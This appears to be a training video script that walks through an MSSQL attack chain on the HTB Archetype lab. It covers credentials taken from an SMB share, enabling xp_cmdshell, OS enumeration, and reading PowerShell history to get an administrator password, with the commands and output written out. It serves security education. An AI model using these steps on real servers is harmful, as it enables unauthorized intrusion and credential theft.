# VIDEO 37: Database Attacks
### MSSQL Client, Privilege Escalation & Data Exfiltration
**Suggested length:** 16–18 minutes
**License Tier:** Free
**Certification Relevance:** OSCP: Network Exploitation | CEH: System Hacking

---

## INTRO (0:00 – 1:30)

**[Screen: Huginn splash screen with Section 6 title card "Network and OS Exploitation"]**

> "Welcome back to Section 6. In this video, we're exploiting database services — specifically Microsoft SQL Server. Databases are high-value targets in any engagement because they hold sensitive data and frequently have operating system access through built-in features like xp_cmdshell. When you find an exposed MSSQL instance with weak credentials, you often go from database access to full system compromise in minutes."

**[Screen: Warning banner — red border, lock icon, "ISOLATED LAB ENVIRONMENT ONLY" text]**

> "Safety reminder — this entire demonstration uses HTB Archetype, an isolated lab machine specifically designed for learning database exploitation. Never access or exploit database systems without explicit written authorization. Unauthorized database access carries severe legal consequences and can destroy real business data. These techniques are for authorized penetration testing only."

**[Screen: Slide showing video roadmap — MSSQL Protocol → Huginn DB Interface → Credential Discovery → Connection → xp_cmdshell → Privilege Escalation → Data Extraction]**

> "We'll cover how MSSQL authentication works, discover credentials through misconfigured file shares, connect using Huginn's native MSSQL client, enable xp_cmdshell for OS command execution, escalate privileges, and extract sensitive data. This builds on Video 15 where we enumerated database services (see Video 15: Database Enumeration). Today we're exploiting what we found."

---

## SECTION 1: MSSQL Protocol and Authentication (1:30 – 3:30)

**[Screen: Diagram showing TDS (Tabular Data Stream) protocol flow — prelogin → login7 → SQL batch → response]**

> "MSSQL uses the Tabular Data Stream protocol — TDS — for client-server communication. A connection starts with a prelogin packet exchanging version information and encryption negotiation. Then the Login7 packet carries authentication credentials. MSSQL supports two authentication modes: SQL Server authentication with username and password, and Windows authentication using NTLM or Kerberos. Huginn's MSSQL client implements both."

**[Screen: Diagram showing SQL Server authentication vs Windows Authentication — when each is used]**

> "SQL Server authentication stores credentials in the database itself — the classic sa account with a password. Windows authentication passes NTLM hashes, enabling pass-the-hash attacks without knowing the cleartext password. Huginn supports both methods. In mixed-mode environments — which most are — you can try SQL authentication first with common default credentials, then attempt Windows auth with any NTLM hashes you've captured."

**[Screen: Table showing dangerous MSSQL features — xp_cmdshell, OPENROWSET, sp_OACreate, CLR assemblies]**

> "What makes MSSQL especially dangerous from an attacker's perspective are its built-in OS interaction features. xp_cmdshell executes operating system commands directly from SQL. OPENROWSET reads files from the filesystem. sp_OACreate instantiates COM objects. CLR assemblies let you load arbitrary .NET code into the database process. If you have sysadmin privileges on MSSQL, you effectively own the underlying operating system."

---

## SECTION 2: Huginn Database Attacks Interface (3:30 – 5:30)

**[Screen: Huginn application — navigating from Home → DB Attacks page]**

> "Navigate to the DB Attacks page from the sidebar. This is Huginn's dedicated database exploitation interface. Unlike the Database Enumeration module in Recon (see Video 15: Database Enumeration) which focuses on discovery and fingerprinting, this page is built for active exploitation — connecting, querying, escalating, and extracting."

**[Screen: DB Attacks page — showing connection panel, query editor, enumeration tabs, privilege escalation options]**

> "The interface has four main areas. The connection panel at the top handles authentication and session management. The query editor in the center lets you run arbitrary SQL. The enumeration tabs on the left provide one-click database discovery — tables, schemas, users, and permissions. The privilege escalation panel on the right contains automated techniques for escalating from limited SQL access to sysadmin and OS-level control."

**[Screen: Connection panel — fields for host, port, database, authentication type (SQL/Windows), username, password]**

> "In the connection panel, you'll see fields for host, port, database name, authentication type, username, and password. The authentication type dropdown switches between SQL Server authentication and Windows authentication. For Windows auth, you can provide a domain, username, and either a password or NTLM hash. The port defaults to 1433 — the standard MSSQL port."

**[Screen: Highlighting the "Test Connection" button and the "Supported Databases" dropdown showing MSSQL, MySQL, PostgreSQL, Oracle]**

> "Huginn's database connector supports MSSQL, MySQL, PostgreSQL, and Oracle. Each has its own exploitation techniques, but the workflow is similar — connect, enumerate, escalate, extract. Today we're focused on MSSQL against our HTB Archetype target."

---

## SECTION 3: Credential Discovery via SMB (5:30 – 7:30)

**[Screen: Switching briefly to Recon & Enumeration — showing prior SMB enumeration results for 10.10.10.27]**

> "Before we can exploit the database, we need credentials. On Archetype, the attack path starts with SMB. During our earlier reconnaissance (see Video 7: SMB Enumeration), we discovered an accessible file share on this machine. Let's review what we found."

```bash
[SMB] Enumerating shares on 10.10.10.27...
[SMB] \\10.10.10.27\ADMIN$ — Access Denied
[SMB] \\10.10.10.27\backups — READ ACCESS (Anonymous)
[SMB] \\10.10.10.27\C$ — Access Denied
[SMB] \\10.10.10.27\IPC$ — READ ACCESS (Anonymous)
```

**[Screen: Accessing the backups share — showing prod.dtsConfig file contents]**

> "The backups share allows anonymous read access. Inside, there's a file called prod.dtsConfig — a Data Transformation Services configuration file. These files store connection strings for SQL Server Integration Services packages. Let's examine it."

```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." />
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" 
                   Path="\Package.Connections[Destination].Properties[ConnectionString]"
                   ValueType="String">
        <ConfiguredValue>
            Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
            Initial Catalog=Catalog;Provider=SQLNCLI10.1;
            Persist Security Info=True;Auto Translate=False;
        </ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

**[Screen: Highlighting the extracted credentials — User ID: ARCHETYPE\sql_svc, Password: M3g4c0rp123]**

> "There are our credentials in plaintext — sql_svc with password M3g4c0rp123. This is a Windows domain account used for the SQL Server service. Configuration files left in accessible shares are one of the most common ways database credentials are exposed in real environments. Developers back up deployment configs without realizing they contain production passwords."

---

## SECTION 4: Connecting to MSSQL (7:30 – 9:30)

**[Screen: DB Attacks page — entering connection details: host 10.10.10.27, port 1433, Windows auth, ARCHETYPE\sql_svc, M3g4c0rp123]**

> "Back on the DB Attacks page, let's connect. Enter host 10.10.10.27, port 1433, select Windows Authentication, domain ARCHETYPE, username sql_svc, password M3g4c0rp123. Click Connect."

```bash
[MSSQL] Initiating TDS connection to 10.10.10.27:1433...
[MSSQL] PreLogin: Server version 15.0.2000.5 (SQL Server 2019)
[MSSQL] Encryption: Required
[MSSQL] TLS handshake complete
[MSSQL] Sending Login7 with Windows Authentication (NTLM)...
[MSSQL] Authentication successful!
[MSSQL] Connected as: ARCHETYPE\sql_svc
[MSSQL] Server: ARCHETYPE (Microsoft SQL Server 2019)
[MSSQL] Default database: master
```

**[Screen: Connection success indicator — green status, server info displayed]**

> "We're connected as sql_svc. The server identifies itself as SQL Server 2019. Now let's determine our privilege level — are we a regular user or do we have elevated access?"

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

```bash
[MSSQL] Query result:
  Column1
  -------
  1

[MSSQL] ✓ Current user IS a member of sysadmin role
```

**[Screen: Query result showing "1" — indicating sysadmin membership, with explanation tooltip]**

> "The result is 1 — our sql_svc account has sysadmin privileges. This is common for service accounts because lazy administrators grant them maximum permissions rather than scoping access correctly. Sysadmin means we can do anything — including enabling xp_cmdshell for operating system command execution."

---

## SECTION 5: Enabling xp_cmdshell (9:30 – 11:30)

**[Screen: Privilege Escalation panel — "Enable xp_cmdshell" button highlighted with explanation text]**

> "xp_cmdshell is disabled by default in modern SQL Server installations — Microsoft recognized the security risk. But any sysadmin can re-enable it through system stored procedures. In Huginn's privilege escalation panel, click the Enable xp_cmdshell button. Watch the queries it executes."

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

```bash
[MSSQL] Executing: sp_configure 'show advanced options', 1
[MSSQL] Configuration option 'show advanced options' changed from 0 to 1.
[MSSQL] Executing: RECONFIGURE
[MSSQL] Executing: sp_configure 'xp_cmdshell', 1
[MSSQL] Configuration option 'xp_cmdshell' changed from 0 to 1.
[MSSQL] Executing: RECONFIGURE
[MSSQL] ✓ xp_cmdshell enabled successfully
```

**[Screen: xp_cmdshell status indicator changing from red "Disabled" to green "Enabled"]**

> "xp_cmdshell is now active. Let's verify with a simple command — whoami — to confirm we have OS execution and identify which Windows account the SQL Server service runs as."

```sql
EXEC xp_cmdshell 'whoami';
```

```bash
[MSSQL] Query result:
  output
  ------
  archetype\sql_svc
  NULL
```

**[Screen: Command output showing "archetype\sql_svc" — confirming OS-level execution context]**

> "We're executing commands as archetype\\sql_svc on the operating system. This is our OS-level foothold through the database service. The SQL Server process runs as this service account, and xp_cmdshell spawns commands in that context. Now we can enumerate the system, read files, download tools, and work toward full system compromise."

---

## SECTION 6: System Enumeration via xp_cmdshell (11:30 – 13:30)

**[Screen: Query editor — running system enumeration commands through xp_cmdshell]**

> "Let's enumerate the system through our SQL-based command execution. We'll check system information, network configuration, and user privileges."

```sql
EXEC xp_cmdshell 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"';
```

```bash
[MSSQL] Query result:
  output
  ------
  OS Name:                   Microsoft Windows Server 2019 Standard
  OS Version:                10.0.17763 N/A Build 17763
  System Type:               x64-based PC
```

```sql
EXEC xp_cmdshell 'whoami /priv';
```

```bash
[MSSQL] Query result:
  output
  ------
  PRIVILEGES INFORMATION
  ----------------------
  Privilege Name                Description                    State
  ============================= ============================= ========
  SeAssignPrimaryTokenPrivilege Replace a process level token  Disabled
  SeIncreaseQuotaPrivilege      Adjust memory quotas           Disabled
  SeMachineAccountPrivilege     Add workstations to domain     Disabled
  SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
  SeManageVolumePrivilege       Perform volume maintenance     Enabled
  SeImpersonatePrivilege        Impersonate a client           Enabled
```

**[Screen: Highlighting SeImpersonatePrivilege in the output — marked with an arrow and "ESCALATION PATH" label]**

> "There it is — SeImpersonatePrivilege is enabled. This privilege allows the sql_svc account to impersonate other security tokens. Combined with tools like JuicyPotato or PrintSpoofer, this is a direct path to SYSTEM-level access. Service accounts commonly have this privilege because they need to impersonate clients connecting to them."

```sql
EXEC xp_cmdshell 'net user';
```

```bash
[MSSQL] Query result:
  output
  ------
  User accounts for \\ARCHETYPE
  -------------------------------------------------------------------------------
  Administrator            DefaultAccount           Guest
  sql_svc                  WDAGUtilityAccount
  The command completed successfully.
```

**[Screen: Results showing local users — Administrator, sql_svc, and others]**

> "We can see the local user accounts. The Administrator account is our ultimate target. With SeImpersonatePrivilege, we don't need the Administrator's password — we can escalate through token impersonation. But first, let's check for any configuration files or stored credentials on the filesystem."

---

## SECTION 7: Data Extraction and Credential Discovery (13:30 – 15:30)

**[Screen: Running file system commands through xp_cmdshell to find sensitive data]**

> "A common post-exploitation step is searching the filesystem for additional credentials. Service accounts often have access to configuration files, backup scripts, and other artifacts containing passwords. Let's check the user's profile and common locations."

```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```

```bash
[MSSQL] Query result:
  output
  ------
  net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
  exit
```

**[Screen: PowerShell history showing cleartext administrator credentials — highlighted with "CRITICAL FINDING" banner]**

> "The PowerShell command history contains the Administrator password in cleartext — MEGACORP_4dm1n!! — used in a net use command to map a network share. This is incredibly common in real environments. Administrators run commands interactively and forget that PowerShell logs everything to ConsoleHost_history.txt. We now have full administrator credentials without needing to exploit SeImpersonatePrivilege."

**[Screen: DB Attacks page — "Add to Findings" for the administrator credential, severity Critical]**

> "Document this immediately. Add it to Findings as a Critical severity discovery. We have two credential sets now — the sql_svc service account from the config file and the administrator from PowerShell history. Let's also extract data from the database itself."

```sql
SELECT name FROM sys.databases;
```

```bash
[MSSQL] Query result:
  name
  ----
  master
  tempdb
  model
  msdb
  Catalog
```

```sql
USE Catalog;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

```bash
[MSSQL] Query result:
  TABLE_NAME
  ----------
  Products
  Customers
  Orders
  Employees
```

**[Screen: Database schema enumerated — showing tables with row counts]**

> "The Catalog database contains customer data, employee records, and order information. In a real engagement, you'd document the data exposure risk — this database is accessible through a credential found in an anonymous file share. The entire chain from anonymous SMB access to full database and OS control represents a critical finding with a clear, reproducible attack path."

---

## SECTION 8: Certification Mapping and Practice (15:30 – 16:30)

**[Screen: Slide showing OSCP: Network Exploitation domain (database exploitation), CEH: System Hacking (gaining access, privilege escalation)]**

> "Database exploitation maps directly to the OSCP Network Exploitation domain. On the exam, you'll encounter database services that require credential discovery and exploitation for initial access. The xp_cmdshell to privilege escalation chain is a classic exam scenario. For CEH, this covers System Hacking — specifically Gaining Access through service exploitation and Escalating Privileges through OS feature abuse."

**[Screen: Practice recommendations — HTB "Archetype" (this video), HTB "Querier" (MSSQL + xp_cmdshell), THM "MSSQL" room]**

> "For additional practice, HTB Querier is another excellent MSSQL exploitation box with a slightly different credential discovery path. The TryHackMe MSSQL room provides guided practice with each exploitation technique step by step. Both reinforce the credential discovery to database exploitation to OS access methodology."

---

## OUTRO (16:30 – end)

**[Screen: Summary slide — Database Attacks: Credential Discovery → MSSQL Connection → xp_cmdshell → OS Enumeration → Privilege Escalation → Data Extraction | Next: Video 38 — RPC Relay & MITM]**

> "That's database exploitation in Huginn. We discovered credentials in a misconfigured file share, connected to MSSQL with Huginn's native client, enabled xp_cmdshell for OS command execution, enumerated the system, found administrator credentials in PowerShell history, and extracted database contents. The full chain — from anonymous share access to domain administrator — demonstrates why database security is critical. In the next video, we tackle RPC relay and man-in-the-middle attacks — exploiting Windows authentication delegation weaknesses in Active Directory environments. See you there."
